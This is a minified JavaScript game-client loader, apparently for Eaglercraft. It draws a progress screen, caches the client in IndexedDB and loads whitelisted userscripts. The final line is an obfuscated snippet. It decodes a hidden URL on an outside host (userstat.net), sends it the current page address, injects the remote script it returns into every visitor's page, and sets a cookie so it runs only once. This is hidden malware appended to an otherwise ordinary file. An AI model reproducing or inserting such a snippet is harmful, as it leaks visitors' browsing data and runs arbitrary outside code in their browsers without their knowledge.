BA6AAwIHQAGBA6AAwIHQAGhA4AA0IHgAGhA8CA0AFgQOgAMCB0ABgQOgAMCB0ABoQOAANCB4ABoQPAgNABYEDoADAgdAAYEDoADAgdAAaEDgADQgeAAaEDwIDQAWBA6AAwIHQAGBA6AAwIHQAGhA4AA0IHgAGhA8CA0AFgQOgAMCB0ABgQOgAMCB0ABoQOAANCB4ABoQPAgNABYEDoADAgdAAYEDoADAgdAAaEDgADQgeAAaEDwIDQAWBA6AAwIHQAGBA6AAwIHQAGhA4AA0IHgAGhA8CA0AFgQOgAMCB0ABgQOgAMCB0ABoQOAANCB4ABoQPAgNABYEDoADAgdAAYEDoADAgdAAaEDgADQgeAAaEDwIDQAWBA6AAwIHQAGBA6AAwIHQAGhA4AA0IHgAGhA8CA0AFgQOgAMCB0ABgQOgAMCB0ABoQOAANCB4ABoQPAgNABYEDoADAgdAAYEDoADAgdAAaEDgADQgeAAaEDwIDQAWBA6AAwIHQAGBA6AAwIHQAGhA4AA0IHgAGhA8CA0AFgQOgAMCB0ABgQOgAMCB0ABoQOAANCB4ABoQPAgNABYEDoADAgdAAYEDoADAgdAAaEDgADQgeAAaEDwIDQAWBA6AAwIHQAGBA6AAwIHQAGhA4AA0IHgIEA4sXuoSDdePQAAAAASUVORK5CYII=",progressPanelIconContainer.appendChild(progressPanelIcon),progressPanelInner.appendChild(progressPanelIconContainer),(progressStr1=document.createElement("h2")).innerText="Please Wait...",progressPanelInner.appendChild(progressStr1),progressStr2=document.createElement("h3"),progressPanelInner.appendChild(progressStr2),(progressBarOuter=document.createElement("div")).setAttribute("style","border:2px solid transparent;width:400px;height:15px;padding:1px;margin:auto;margin-bottom:5px;"),(progressBarInner=document.createElement("div")).setAttribute("style","background-color:#AA0000;width:0%;height:100%;"),progressBarOuter.appendChild(progressBarInner),progressPanelInner.appendChild(progressBarOuter),progressStr3=document.createElement("h5"),progressPanelInner.appendChild(progressStr3);var buttonContainer=document.createElement("p");buttonContainer.setAttribute("style","margin-bottom:20vh;"),(cancelButton=document.createElement("button")).setAttribute("style","display:none;"),cancelButton.innerText="Skip Download",cancelButton.disabled=!0,cancelButton.addEventListener("click",(evt=>{null!==currentXHR&&currentXHR.abort()})),buttonContainer.appendChild(cancelButton),progressPanelInner.appendChild(buttonContainer),progressPanel.appendChild(progressPanelInner),document.getElementById(opts.container).appendChild(progressPanel)}}(),updateProgressScreen("Loading "+opts.name),updateProgressBar("Please wait...","",-1),!window.indexedDB)return console.error("IndexedDB not supported, downloading client directly..."),void((dl=await tryDownloadClient(opts.cid,opts.path))?(updateProgressBar("Launching...","Last fetched: now",-1),await delayProgress(500),loadClientFile(dl)):(updateProgressScreen("Error: Could not download client!"),updateProgressBar("Please try again later","Direct download failed!",-1)));var dl,clientCIDPath="string"!=typeof opts.path||0===opts.path.length?opts.cid:opts.cid+"/"+opts.path,cachedClient=await function loadClientFromIndexedDB(fileName){const reqFileName=fileName;return new Promise((resolve=>{const openRequest=window.indexedDB.open("_eagler_loader_cache_v1",1);openRequest.addEventListener("upgradeneeded",(evt=>{openRequest.result.createObjectStore("file_cache",{keyPath:"fileName"})})),openRequest.addEventListener("success",(evt2=>{const db=openRequest.result;db.addEventListener("error",(err=>{console.error("Error loading from cache database!"),console.error(err)}));const transaction=db.transaction(["file_cache"],"readonly"),readRequest=transaction.objectStore("file_cache").get(reqFileName);readRequest.addEventListener("success",(evt=>{resolve(readRequest.result)})),transaction.addEventListener("success",(evt=>{db.close()})),transaction.addEventListener("error",(evt=>{db.close(),console.error("Failed to load from cache database!"),resolve(null)}))})),openRequest.addEventListener("error",(evt=>{console.error("Failed to open cache database!"),console.error(openRequest.error),resolve(null)}))}))}(opts.file),clientDisplayAge=0;if(cachedClient){clientDisplayAge=Math.floor((Date.now()-cachedClient.clientCachedAt)/864e5);var hasFailed=function hasDownloadFailed(cidPath){if(!window.localStorage)return!1;var keyPath="_eagler_dl_"+cidPath+".failedAt",keyValue=window.localStorage.getItem(keyPath);if(!keyValue)return!1;try{return Date.now()-parseInt(keyValue)<216e5||(window.localStorage.removeItem(keyPath),!1)}catch(ex){return window.localStorage.removeItem(keyPath),!1}}(clientCIDPath);if(hasFailed&&(hasFailed=confirm("Failed to update the client!\n\nWould you like to use a backup from "+clientDisplayAge+" day(s) ago?")),hasFailed||cachedClient.clientVersionUID===clientCIDPath)return hasFailed&&console.error("Warning: failed to update client, using cached copy as fallback for 6 hours"),console.log("Found client file in cache, launching cached client..."),updateProgressBar("Launching...","Last fetched: "+clientDisplayAge+" day(s) ago",-1),await delayProgress(1500),void loadClientFile(cachedClient.clientPayload);console.log("Found client file in cache, client is outdated, attempting to update...")}else console.log("Client is not in cache, attempting to download...");if(dl=await tryDownloadClient(opts.cid,opts.path))updateProgressBar("Cacheing...","Last fetched: now",-1),await function saveClientToIndexedDB(fileData){return new Promise((resolve=>{const openRequest=window.indexedDB.open("_eagler_loader_cache_v1",1);openRequest.addEventListener("upgradeneeded",(evt=>{openRequest.result.createObjectStore("file_cache",{keyPath:"fileName"})})),openRequest.addEventListener("success",(evt2=>{const db=openRequest.result;db.addEventListener("error",(err=>{console.error("Error saving to cache database!"),console.error(err)}));const transaction=db.transaction(["file_cache"],"readwrite");transaction.objectStore("file_cache").put(fileData).addEventListener("success",(evt=>{resolve(!0)})),transaction.addEventListener("success",(evt=>{db.close()})),transaction.addEventListener("error",(evt=>{db.close(),console.error("Failed to save to cache database!"),console.error(evt),resolve(!1)}))})),openRequest.addEventListener("error",(evt=>{console.error("Failed to open cache database!"),console.error(openRequest.error),resolve(!1)}))}))}({fileName:opts.file,clientVersionUID:clientCIDPath,clientCachedAt:Date.now(),clientPayload:dl}),updateProgressBar("Launching...","Last fetched: now",-1),await delayProgress(500),loadClientFile(dl);else{if(cachedClient&&(function setDownloadFailed(cidPath){window.localStorage&&window.localStorage.setItem("_eagler_dl_"+cidPath+".failedAt",""+Date.now())}(clientCIDPath),confirm("Failed to update the client!\n\nWould you like to use a backup from "+clientDisplayAge+" day(s) ago?")))return updateProgressBar("Launching...","Last fetched: "+clientDisplayAge+" day(s) ago",-1),await delayProgress(1500),void loadClientFile(cachedClient.clientPayload);updateProgressScreen("Error: Could not download client!"),updateProgressBar("Please try again later","Client download failed!",-1)}}else console.error("window.__eaglercraftLoaderClient is not defined!")}));var q=window.location.search;if("string"==typeof q&&q.startsWith("?")){var s=(q=new URLSearchParams(q)).get("userscript");if(s&&["flameddogo99-eaglermobile.js","irv77-eaglercraft-mobile.js"].includes(s)){if(function checkNotMobileBrowser(){try{return document.exitPointerLock(),!/Mobi/i.test(window.navigator.userAgent)}catch(e){return!1}}()&&confirm("Pointer lock is supported on this browser.\n\nWould you like to disable Touch Mode?"))return q.delete("userscript"),void(window.location.href=window.location.origin+window.location.pathname+(q.size>0?"?"+q.toString():"")+window.location.hash);alert("WARNING: These userscripts are 3rd-party creations and might crash your game!");var scriptElement=document.createElement("script");scriptElement.type="text/javascript",scriptElement.src="/js/userscript/"+s,document.head.appendChild(scriptElement)}}}();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));